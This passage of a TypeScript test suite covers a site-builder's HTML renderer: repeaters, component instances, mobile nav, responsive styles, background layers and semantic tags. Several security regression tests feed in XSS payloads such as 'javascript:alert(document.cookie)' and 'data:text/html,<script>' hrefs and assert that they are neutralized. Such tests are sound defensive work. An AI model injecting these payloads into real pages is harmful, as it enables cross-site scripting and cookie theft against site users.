  assert.ok(!html.includes("javascript:alert"), "unsafe href never reaches markup");
  assert.ok(!html.includes('href="javascript'), "link target dropped");
});

test("repeaters: bound image src is validated before rendering", () => {
  const html = render([repeatCard()], {
    dataSources: {
      collections: {
        featured_talent_profiles: [
          { id: "talent-1", displayName: "Bad image", imageUrl: "data:image/svg+xml,<svg/>" },
        ],
      },
    },
  });

  assert.ok(html.includes("Bad image"));
  assert.ok(!html.includes("data:image"), "unsafe image src never reaches markup");
});

test("repeaters: nested repeaters render once per outer item, not cartesian", () => {
  const node = repeatCard() as Extract<BuilderNode, { kind: "container" }>;
  const template = node.children[0] as BuilderNode & { children: BuilderNode[] };
  template.children = [
    {
      id: "nested",
      kind: "container",
      props: {
        layout: "stack",
        dataBinding: {
          sourceKey: "featured_talent_profiles",
          mode: "bound",
          repeat: true,
          maxItems: 10,
        },
      },
      children: [
        {
          id: "nested-name",
          kind: "heading",
          props: { text: "Nested {{displayName}}", level: 4 },
        },
      ],
    },
  ];
  const html = render([node], {
    dataSources: {
      collections: {
        featured_talent_profiles: [
          { id: "talent-1", displayName: "Ana" },
          { id: "talent-2", displayName: "Bea" },
        ],
      },
    },
  });

  assert.equal((html.match(/Nested /g) ?? []).length, 2);
  assert.ok(html.includes("Nested Ana") && html.includes("Nested Bea"));
});

// ── Living Components Phase 3 ─────────────────────────────────────────────────

const MASTER: BuilderNode = {
  id: "master", kind: "container", props: { layout: "stack" },
  children: [
    { id: "m-h", kind: "heading", props: { text: "MASTER HEADING", level: 2 } },
    { id: "m-b", kind: "button", props: { label: "Master CTA", href: "/m", tone: "primary" } },
  ],
} as BuilderNode;

function instance(id: string, overrides?: Record<string, unknown>): BuilderNode {
  return {
    id, kind: "container",
    props: { layout: "stack", instanceOf: "cmp-1", ...(overrides ? { instanceOverrides: overrides } : {}) },
    children: [{ id: `${id}-fallback`, kind: "heading", props: { text: "FALLBACK", level: 2 } }],
  } as BuilderNode;
}

test("phase3: instance resolves master LIVE + per-instance override + namespaced ids", () => {
  const html = render(
    [instance("instA"), instance("instB", { "m-h": { text: "OVERRIDDEN" } })],
    { components: { "cmp-1": MASTER } },
  );
  assert.ok(html.includes("MASTER HEADING"), "instA shows master heading live");
  assert.ok(html.includes("OVERRIDDEN"), "instB heading overridden");
  assert.ok((html.match(/Master CTA/g) || []).length >= 2, "both instances keep master CTA (structure linked)");
  assert.ok(html.includes("instA__m-h") && html.includes("instB__m-h"), "ids namespaced per instance");
  assert.ok(!html.includes("FALLBACK"), "live resolution replaces stored fallback");
});

test("phase3: missing component + no-components both fall back to stored children (never blank)", () => {
  // component map present but missing this id
  const missing = render([instance("instC")], { components: { "other-cmp": MASTER } });
  assert.ok(missing.includes("FALLBACK") && !missing.includes("MASTER HEADING"), "missing component → stored fallback");
  // no components passed at all
  const none = render([instance("instD")]);
  assert.ok(none.includes("FALLBACK") && !none.includes("MASTER HEADING"), "no components → stored fallback");
});

// ── SECURITY: section-level inline rich text href allowlist ───────────────────
// Regression for a LIVE pre-Wave-2 prod XSS: renderInlineRich rendered markdown
// link hrefs straight into <a href> with no scheme guard, so a `javascript:`
// link in any section text field was a clickable cross-tenant XSS on the shared
// apex (parent-scoped cookies, unsafe-inline CSP). The href allowlist now blocks
// it at the shared chokepoint that ~45 section components funnel through.

test("security: renderInlineRich keeps safe https + relative markdown links", () => {
  const html = renderRich("[ext](https://example.com) and [home](/directory) and [anchor](#top)");
  assert.ok(html.includes('href="https://example.com"'), "https anchor kept");
  assert.ok(html.includes('href="/directory"'), "relative anchor kept");
  assert.ok(html.includes('href="#top"'), "in-page anchor kept");
  assert.ok(html.includes('target="_blank"'), "external link target preserved");
});

test("security: renderInlineRich neutralizes javascript:/data:/vbscript: links to plain text", () => {
  for (const scheme of [
    "[click](javascript:alert(1))",
    "[x](JavaScript:alert(1))",
    "[y](data:text/html,<script>alert(1)</script>)",
    "[z](vbscript:msgbox(1))",
  ]) {
    const html = renderRich(scheme).toLowerCase();
    assert.ok(!/<a[\s>]/.test(html), `no anchor rendered for ${scheme}`);
    assert.ok(!html.includes("href="), `no href attribute emitted for ${scheme}`);
  }
  // the link label survives as readable text
  assert.ok(renderRich("[click](javascript:alert(1))").includes("click"), "label kept as text");
});

// ── SECURITY: structured href fields (button/CTA) render-time scheme guard ─────
// Sibling of the rich-text guard above, for STRUCTURED href fields (button
// `href`, pricing `ctaHref`, section `ctaHref`/`rsvpUrl`/`brandHref`). These are
// guarded at publish time, but admin Duplicate / JSON import / legacy data /
// direct DB writes bypass preflight. prefixPublicHref now neutralizes
// dangerous-scheme hrefs at render so the published <a> can never be a
// clickable XSS. `render()` here uses an empty publicPathPrefix → the apex
// surface, the exact attack target.

function buttonNode(href: string): BuilderNode {
  return { id: "b1", kind: "button", props: { href, label: "Go" } } as BuilderNode;
}

test("security: button node renders dangerous-scheme href as # on the apex surface", () => {
  for (const href of [
    "javascript:alert(1)",
    "JavaScript:alert(document.cookie)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
  ]) {
    const html = render([buttonNode(href)]);
    assert.ok(html.includes('href="#"'), `neutralized to # for ${href}`);
    assert.ok(!html.toLowerCase().includes("javascript:"), `no javascript: href for ${href}`);
    assert.ok(!html.toLowerCase().includes("vbscript:"), `no vbscript: href for ${href}`);
    assert.ok(!html.toLowerCase().includes("data:text"), `no data: href for ${href}`);
    assert.ok(html.includes(">Go<"), `label preserved for ${href}`);
  }
});

test("security: button node preserves legitimate mailto/tel/https/relative hrefs", () => {
  assert.ok(render([buttonNode("mailto:hi@example.com")]).includes('href="mailto:hi@example.com"'));
  assert.ok(render([buttonNode("tel:+15551234567")]).includes('href="tel:+15551234567"'));
  assert.ok(render([buttonNode("https://example.com")]).includes('href="https://example.com"'));
  assert.ok(render([buttonNode("/directory")]).includes('href="/directory"'));
  assert.ok(render([buttonNode("#section")]).includes('href="#section"'));
});

// ── REGRESSION: data:image/* URIs must render (dropped after P3 image validation) ──
test("regression: data:image/* image src renders; data:text/html is rejected", () => {
  const ok = render([
    { id: "img-data", kind: "image", props: { src: "data:image/svg+xml,%3Csvg%3E%3C/svg%3E", alt: "inline svg", style: {} } } as BuilderNode,
  ]);
  assert.ok(ok.includes("<img"), "data:image/* renders an <img>");
  assert.ok(ok.includes("data:image/svg+xml"), "data:image src is preserved");

  const bad = render([
    { id: "img-html", kind: "image", props: { src: "data:text/html,<script>alert(1)</script>", alt: "x", style: {} } } as BuilderNode,
  ]);
  assert.ok(!bad.includes("<img"), "data:text/html is not a valid image src and is dropped");
});

// ── Nav node → mobile disclosure (Responsive-axis fix) ──────────────────────────
//
// The desktop link row used to vanish on mobile (visibility:hidden, no
// replacement). The `nav` node renders the links inline on desktop AND inside a
// CSS-only <details>/<summary> hamburger menu, so they stay reachable at every
// width. A single-frame static render can't evaluate @media, so these assert
// BOTH halves of the proof: (a) the disclosure markup + every link exist in the
// DOM (not visibility:hidden-into-nothing), and (b) the emitted stylesheet
// reveals the disclosure / hides the inline row at the collapse breakpoint.

function navNode(props: Record<string, unknown> = {}): BuilderNode {
  return {
    id: "nav1",
    kind: "nav",
    props: {
      brand: "Atelier",
      brandHref: "/",
      collapseAt: "mobile",
      menuLabel: "Open menu",
      ariaLabel: "Primary",
      links: [
        { id: "l1", label: "Work", href: "/work" },
        { id: "l2", label: "About", href: "/about" },
        { id: "l3", label: "Contact", href: "/contact" },
      ],
      ...props,
    },
  } as BuilderNode;
}

function countOccurrences(haystack: string, needle: string): number {
  return haystack.split(needle).length - 1;
}

function disclosureBlock(html: string): string {
  const start = html.indexOf("<details");
  const end = html.indexOf("</details>");
  assert.ok(start !== -1 && end !== -1, "nav renders a <details> disclosure");
  return html.slice(start, end + "</details>".length);
}

test("nav: renders a <nav> landmark with inline link row + hamburger disclosure", () => {
  const html = render([navNode()]);
  // Element-level claims use the rendered class="…" attribute (the bare class
  // names also appear in the <style> rules, so a substring check would be a
  // false positive). renderToStaticMarkup keeps composed classNames intact.
  assert.ok(html.includes("<nav"), "uses a real <nav> landmark element");
  assert.ok(html.includes('aria-label="Primary"'), "nav landmark is labelled");
  assert.ok(html.includes('data-bn-collapse="mobile"'), "collapse breakpoint attr");
  assert.ok(html.includes('class="site-builder-node site-builder-node--nav"'), "nav root element");
  assert.ok(html.includes('class="site-builder-node--nav-links"'), "inline desktop link row");
  assert.ok(html.includes('class="site-builder-node--nav-disclosure"'), "mobile disclosure element");
  assert.ok(html.includes('class="site-builder-node--nav-burger"'), "hamburger glyph element");
  // Brand renders as a link to its href.
  assert.ok(html.includes(">Atelier<"), "brand label");
  // Renderer CSS still emits exactly once (PERF-1 not regressed).
  assert.equal(countRendererStyles(html), 1);
});

test("nav: links remain reachable on mobile — every link is inside the disclosure menu", () => {
  const html = render([navNode()]);
  const disclosure = disclosureBlock(html);
  // The toggle is a focusable <summary> wired to the menu, with an accessible
  // label — keyboard-operable, not hover-dependent.
  assert.ok(disclosure.includes("<summary"), "toggle is a <summary> (focusable, keyboard-operable)");
  assert.ok(disclosure.includes("site-builder-node--nav-toggle"), "toggle class");
  assert.ok(disclosure.includes('aria-label="Open menu"'), "toggle has accessible label");
  assert.ok(disclosure.includes('aria-controls="nav1-menu"'), "toggle controls the menu");
  assert.ok(disclosure.includes('id="nav1-menu"'), "menu has the controlled id");
  // EVERY link is present *inside the disclosure menu* (mobile copy), with real
  // hrefs — not collapsed to nothing.
  for (const [label, href] of [["Work", "/work"], ["About", "/about"], ["Contact", "/contact"]]) {
    assert.ok(disclosure.includes(`>${label}<`), `menu contains "${label}"`);
    assert.ok(disclosure.includes(`href="${href}"`), `menu contains href ${href}`);
  }
  // Each link appears twice overall: once inline (desktop) + once in the menu
  // (mobile). That duplication is the static proof both code paths emit links.
  assert.equal(countOccurrences(html, 'href="/work"'), 2, "Work link in both rows");
  assert.equal(countOccurrences(html, 'href="/about"'), 2, "About link in both rows");
  assert.equal(countOccurrences(html, 'href="/contact"'), 2, "Contact link in both rows");
});

test("nav: stylesheet reveals the disclosure and hides the inline row at the mobile breakpoint", () => {
  const html = render([navNode({ collapseAt: "mobile" })]);
  // Desktop default: disclosure hidden, inline row shown.
  assert.ok(
    html.includes(".site-builder-node--nav-disclosure{display:none"),
    "disclosure hidden by default (desktop)",
  );
  // ≤640px: inline row hides, disclosure shows — links reachable via hamburger.
  assert.ok(html.includes("@media (max-width:640px)"), "mobile media query present");
  assert.ok(
    html.includes('[data-bn-collapse="mobile"] .site-builder-node--nav-links{display:none}'),
    "inline row hidden on mobile",
  );
  assert.ok(
    html.includes('[data-bn-collapse="mobile"] .site-builder-node--nav-disclosure{display:block}'),
    "disclosure revealed on mobile",
  );
});

test("nav: collapseAt='tablet' collapses at the 900px breakpoint", () => {
  const html = render([navNode({ collapseAt: "tablet" })]);
  assert.ok(html.includes('data-bn-collapse="tablet"'), "tablet collapse attr");
  assert.ok(
    html.includes('[data-bn-collapse="tablet"] .site-builder-node--nav-disclosure{display:block}'),
    "disclosure revealed at the tablet breakpoint",
  );
});

test("nav: defaults apply when optional props are omitted", () => {
  const html = render([
    {
      id: "nav2",
      kind: "nav",
      props: { links: [{ id: "x", label: "Home", href: "/" }] },
    } as BuilderNode,
  ]);
  assert.ok(html.includes('data-bn-collapse="mobile"'), "defaults to mobile collapse");
  assert.ok(html.includes('aria-label="Primary"'), "defaults nav landmark label");
  assert.ok(html.includes('aria-label="Menu"'), "defaults toggle label");
  // No brand ELEMENT (the class also appears in the <style> rule, so match the
  // rendered class attribute, not the bare class name).
  assert.ok(
    !html.includes('class="site-builder-node--nav-brand"'),
    "no brand link when brand omitted",
  );
});

test("nav: dangerous link + brand hrefs are neutralized at render time", () => {
  const html = render([
    navNode({
      brandHref: "javascript:alert(1)",
      links: [
        { id: "l1", label: "Safe", href: "/ok" },
        { id: "l2", label: "Bad", href: "javascript:alert(document.cookie)" },
      ],
    }),
  ]);
  assert.ok(!html.toLowerCase().includes("javascript:"), "no javascript: scheme survives");
  assert.ok(html.includes('href="#"'), "dangerous hrefs neutralized to #");
  assert.ok(html.includes(">Bad<"), "neutralized link still renders its label");
  assert.ok(html.includes('href="/ok"'), "safe link preserved");
});

test("nav: re-render is byte-identical (determinism)", () => {
  const node = navNode();
  assert.equal(render([node]), render([node]));
});

// Wave 2 · Item 2A — per-breakpoint STRUCTURE: visibility (#3) + order (#4).
// Both are optional BuilderNodeStyleValue fields, so they ride the SAME
// per-breakpoint CSS path as every other escape (gated data-attr → static
// @media rule reading a --bn-{bp}-* var). These tests lock the emitted CSS at
// desktop / tablet / mobile / container-query so a future refactor can't
// silently regress the responsive hide-or-reorder.
test("structure: the static sheet ships the hidden + order rules at both breakpoints", () => {
  const html = render([container({})]);
  for (const rule of [
    ".site-builder-node[data-builder-style-tablet-hidden]{display:none!important}",
    ".site-builder-node[data-builder-style-mobile-hidden]{display:none!important}",
    ".site-builder-node[data-builder-style-tablet-order]{order:var(--bn-tablet-order)!important}",
    ".site-builder-node[data-builder-style-mobile-order]{order:var(--bn-mobile-order)!important}",
  ]) {
    assert.ok(html.includes(rule), `static sheet ships: ${rule}`);
  }
});

test("structure: per-breakpoint order emits the gate + the var (incl. order:0)", () => {
  const html = render([
    container({
      order: 1, // desktop base — inline
      responsive: {
        tablet: { order: -1 }, // negative pulls ahead of order:0 siblings
        mobile: { order: 0 }, // edge case: 0 is meaningful, must still emit
      },
    }),
  ]);

  // Desktop base order is applied inline (not gated behind a media rule).
  assert.ok(html.includes("order:1"), "desktop base order inline");

  // Tablet override: gating attr + var.
  assert.ok(
    html.includes('data-builder-style-tablet-order=""'),
    "tablet order gate",
  );
  assert.ok(html.includes("--bn-tablet-order:-1"), "tablet order var (negative)");

  // Mobile override with order:0 — the numeric gate must NOT treat 0 as unset.
  assert.ok(
    html.includes('data-builder-style-mobile-order=""'),
    "mobile order gate fires for order:0",
  );
  assert.ok(html.includes("--bn-mobile-order:0"), "mobile order var is 0");
});

test("structure: per-breakpoint visibility hides only at that breakpoint", () => {
  const html = render([
    container({
      responsive: {
        tablet: { visibility: "hidden" },
        mobile: { visibility: "hidden" },
      },
    }),
  ]);

  // The gate is the presence attr; the static sheet's media rule supplies the
  // display:none. No INLINE desktop display:none — desktop stays shown. (The
  // substring "display:none" DOES appear in the static @media sheet, so we
  // assert specifically that the node's own inline style="…" doesn't carry it.)
  assert.ok(
    html.includes('data-builder-style-tablet-hidden=""'),
    "tablet hidden gate",
  );
  assert.ok(
    html.includes('data-builder-style-mobile-hidden=""'),
    "mobile hidden gate",
  );
  const inlineStyles = [...html.matchAll(/style="([^"]*)"/g)].map((m) => m[1]);
  assert.ok(
    inlineStyles.every((s) => !s.includes("display:none")),
    "no inline desktop display:none when only breakpoints hide",
  );
});

test("structure: desktop-level visibility:hidden removes the node inline everywhere", () => {
  const html = render([container({ visibility: "hidden" })]);
  // sharedNodeStyle emits display:none inline at the base layer, so the node is
  // gone on every screen (the breakpoint layers inherit it). Assert the inline
  // style="…" carries it (not merely the static sheet's media rules).
  const inlineStyles = [...html.matchAll(/style="([^"]*)"/g)].map((m) => m[1]);
  assert.ok(
    inlineStyles.some((s) => s.includes("display:none")),
    "desktop hidden emits inline display:none",
  );
});

test("structure: container-query scope emits order + hidden too", () => {
  const html = render([
    container({
      containerType: "inline-size",
      containerQueries: {
        mobile: { order: 2, visibility: "hidden" },
      },
    }),
  ]);

  assert.ok(
    html.includes('data-builder-style-cq-mobile-order=""'),
    "cq mobile order gate",
  );
  assert.ok(
    html.includes("--bn-cq-mobile-order:2"),
    "cq mobile order var",
  );
  assert.ok(
    html.includes('data-builder-style-cq-mobile-hidden=""'),
    "cq mobile hidden gate",
  );
});

// ── Wave 3 · 3C: background layers + gradient CSS emission ───────────────────

test("backgroundLayers: two gradient layers emit stacked background-image CSS", () => {
  const html = render([
    container({
      backgroundLayers: [
        {
          type: "gradient",
          value: "linear-gradient(135deg, #6366f1 0%, #ec4899 100%)",
        },
        {
          type: "gradient",
          value: "linear-gradient(180deg, rgba(0,0,0,0.6) 0%, transparent 60%)",
        },
      ],
    }),
  ]);
  // Both gradient strings must be comma-joined in background-image
  assert.ok(
    html.includes("linear-gradient(135deg"),
    "first gradient layer present",
  );
  assert.ok(
    html.includes("linear-gradient(180deg"),
    "second gradient layer present",
  );
  // Multi-layer stacks are comma-joined
  assert.ok(
    html.includes("linear-gradient(135deg, #6366f1 0%, #ec4899 100%),linear-gradient(180deg"),
    "layers joined with comma",
  );
  // Paint axes default to cover/center/no-repeat, repeated per layer
  assert.ok(html.includes("background-size:cover,cover"), "size repeated");
  assert.ok(html.includes("background-position:center,center"), "position repeated");
});

test("backgroundLayers: color layer emits wrapped gradient", () => {
  const html = render([
    container({
      backgroundLayers: [
        { type: "color", value: "rgba(0,0,0,0.4)" },
      ],
    }),
  ]);
  // Color layers are wrapped as linear-gradient(color,color) so they participate
  assert.ok(
    html.includes("linear-gradient(rgba(0,0,0,0.4),rgba(0,0,0,0.4))"),
    "color layer wrapped as gradient",
  );
});

test("backgroundLayers: image layer emits url() in background-image", () => {
  const html = render([
    container({
      backgroundLayers: [
        { type: "image", value: "url(https://example.com/photo.jpg)" },
      ],
    }),
  ]);
  assert.ok(
    html.includes("url(https://example.com/photo.jpg)"),
    "image url preserved",
  );
  assert.ok(html.includes("background-size:cover"), "paint axes set");
});

test("backgroundLayers: image layer prepended to existing backgroundImage", () => {
  const html = render([
    container({
      backgroundImage: "url(https://example.com/base.jpg)",
      backgroundLayers: [
        {
          type: "gradient",
          value: "linear-gradient(135deg, rgba(0,0,0,0.5), transparent)",
        },
      ],
    }),
  ]);
  // The overlay gradient must come before the existing background image
  assert.ok(
    html.includes(
      "linear-gradient(135deg, rgba(0,0,0,0.5), transparent),url(https://example.com/base.jpg)",
    ),
    "overlay prepended to existing backgroundImage",
  );
  // Three layers total (gradient overlay + base), so size is cover,cover
  assert.ok(html.includes("background-size:cover,cover"), "size repeated for both");
});

test("backgroundLayers: backgroundBlendMode emitted when set", () => {
  const html = render([
    container({
      backgroundLayers: [
        { type: "gradient", value: "linear-gradient(90deg, #000, #fff)" },
      ],
      backgroundBlendMode: "multiply",
    }),
  ]);
  assert.ok(
    html.includes("background-blend-mode:multiply"),
    "blend mode emitted",
  );
});

test("backgroundLayers: empty/absent preserves existing backgroundImage byte-identical", () => {
  const withBgImage = render([
    container({ backgroundImage: "url(https://example.com/img.jpg)" }),
  ]);
  const withBgImageAndEmpty = render([
    container({
      backgroundImage: "url(https://example.com/img.jpg)",
      backgroundLayers: [],
    }),
  ]);
  assert.equal(
    withBgImage,
    withBgImageAndEmpty,
    "empty backgroundLayers array is byte-identical to no backgroundLayers",
  );
  // backgroundBlendMode alone (no layers) does NOT get emitted to the static
  // render since the renderer gates it on layers presence — guard that too.
  const noLayers = render([container({})]);
  assert.ok(!noLayers.includes("background-blend-mode"), "no blend mode without layers");
});

test("backgroundLayers: node with only backgroundColor/backgroundImage renders byte-identical (flagship guard)", () => {
  // Simulate a flagship-style node that uses the old scalar fields.
  const legacy = render([
    container({
      backgroundColor: "#111",
      backgroundImage: "linear-gradient(180deg, transparent, rgba(0,0,0,0.7))",
      backgroundSize: "cover",
      backgroundPosition: "center",
      backgroundRepeat: "no-repeat",
    }),
  ]);
  // Must not inject a second background-image stacking or emit blend mode.
  const bgImageCount = (legacy.match(/background-image:/gi) ?? []).length;
  assert.ok(bgImageCount >= 1, "background-image present");
  assert.ok(!legacy.includes("background-blend-mode"), "no blend mode injection");
});

// ── W4-T1: style-engine bridge render cascade pin ─────────────────────────────
// Pins the DOCUMENTED cascade order (sharedNodeStyle: "Free-value escapes —
// applied last so they override the token presets above") through the REAL
// renderBuilderNodes path, fed by the curated→freeform bridge. This is the
// seatbelt for the W4-T2 dual-inspector collapse: if a future change reorders
// the cascade so a token preset wins over a free escape (or `tone` wins over
// `textColor`), these assertions break.

function headingWithStyle(style: Record<string, unknown>): BuilderNode {
  return {
    id: "h1",
    kind: "heading",
    props: { text: "Cascade", level: 2, style },
  } as BuilderNode;
}

test("bridge cascade: nodePresentation px-int spacing renders as px CSS through renderBuilderNodes", () => {
  const style = nodePresentationToBuilderStyle({
    align: "left",
    maxWidthPx: 740,
    marginTopPx: 14,
    marginBottomPx: 18,
    paddingTopPx: 6,
    paddingBottomPx: 8,
  });
  const html = render([headingWithStyle(style as Record<string, unknown>)]);
  assert.match(html, /text-align:left/);
  assert.match(html, /max-width:740px/);
  assert.match(html, /margin-top:14px/);
  assert.match(html, /margin-bottom:18px/);
  assert.match(html, /padding-top:6px/);
  assert.match(html, /padding-bottom:8px/);
});

test("bridge cascade: a free fontSize (from fontSizePx) WINS over the size token", () => {
  // size:"sm" is a token preset; fontSizePx:48 is the free escape. The renderer
  // applies the free escape last (documented), so the rendered font-size is 48px.
  const style = nodePresentationToBuilderStyle({ size: "sm", fontSizePx: 48 });
  const html = render([headingWithStyle(style as Record<string, unknown>)]);
  assert.match(html, /font-size:48px/, "free fontSize must win over the size token");
});

test("bridge cascade: textColor WINS over the tone token (free escape applied last)", () => {
  // tone:"muted" sets a muted color token; textColor is the raw free escape and
  // must win — pin the documented order (tone before, textColor after).
  const style = nodePresentationToBuilderStyle({ tone: "muted", textColor: "#ff0000" });
  const html = render([headingWithStyle(style as Record<string, unknown>)]);
  // The final color declaration must be the raw textColor, not the muted token.
  assert.match(html, /color:#ff0000/, "textColor must win over tone");
  assert.ok(
    !/color:rgba\(18, 18, 18, 0\.62\)/.test(html) ||
      html.lastIndexOf("#ff0000") > html.lastIndexOf("rgba(18, 18, 18, 0.62)"),
    "textColor must be the last-wins color",
  );
});

test("bridge cascade: visibility hidden renders display:none", () => {
  const style = nodePresentationToBuilderStyle({ visibility: "hidden" });
  const html = render([headingWithStyle(style as Record<string, unknown>)]);
  assert.match(html, /display:none/);
});

// ── REND-1: Semantic HTML tags on builder containers ──────────────────────────

function containerWithTag(htmlTag?: string): BuilderNode {
  return {
    id: "rend1-c",
    kind: "container",
    props: {
      layout: "stack",
      ...(htmlTag ? { htmlTag } : {}),
      style: {},
    },
    children: [{ id: "rend1-h", kind: "heading", props: { text: "Hello", level: 2 } }],
  } as BuilderNode;
}

test("REND-1: container without htmlTag renders as <div> (byte-stable)", () => {
  const html = render([containerWithTag()]);
  // Must open with a div carrying the expected class
  assert.ok(
    html.includes('<div'),
    "no-htmlTag container must render as <div>",
  );
  assert.ok(
    html.includes('site-builder-node--container'),
    "must carry site-builder-node--container class",
  );
  // Must NOT emit a section/article/aside/header/footer/nav/main tag
  for (const tag of ["section", "article", "aside", "header", "footer", "nav", "main"]) {
    assert.ok(
      !html.includes(`<${tag}`),
      `no-htmlTag container must not emit <${tag}>`,
    );
  }
});

test("REND-1: container with htmlTag='section' renders as <section>", () => {
  const html = render([containerWithTag("section")]);
  assert.ok(html.includes("<section"), "must open with <section");
  assert.ok(html.includes("</section>"), "must close with </section>");
  // All structural attrs must be preserved on the semantic element
  assert.ok(html.includes('site-builder-node--container'), "class preserved on <section>");
  assert.ok(html.includes('data-builder-node-kind="container"'), "data-builder-node-kind preserved");
  assert.ok(html.includes('data-builder-layout="stack"'), "data-builder-layout preserved");
  // Must NOT fall back to div
  assert.ok(!html.includes("<div"), "must not emit a <div> for the container");
});

test("REND-1: each semantic tag renders correctly", () => {
  for (const tag of ["article", "aside", "header", "footer", "nav", "main"] as const) {
    const html = render([containerWithTag(tag)]);
    assert.ok(html.includes(`<${tag}`), `tag=${tag}: must open with <${tag}`);
    assert.ok(html.includes(`</${tag}>`), `tag=${tag}: must close with </${tag}>`);
    assert.ok(
      html.includes('site-builder-node--container'),
      `tag=${tag}: class preserved`,
    );
    assert.ok(
      !html.includes("<div"),
      `tag=${tag}: must not emit the default <div>`,
    );
  }
});

test("REND-1: container children render inside the semantic tag", () => {
  const html = render([containerWithTag("section")]);
  // The heading child must appear inside the section
  assert.ok(html.includes("Hello"), "child text must be rendered");
  // Structural order: <section…><h2>Hello</h2></section>
  const sectionStart = html.indexOf("<section");
  const sectionEnd = html.indexOf("</section>");
  const headingPos = html.indexOf("<h2");
  assert.ok(headingPos > sectionStart, "heading must come after section open tag");
  assert.ok(headingPos < sectionEnd, "heading must come before section close tag");
});
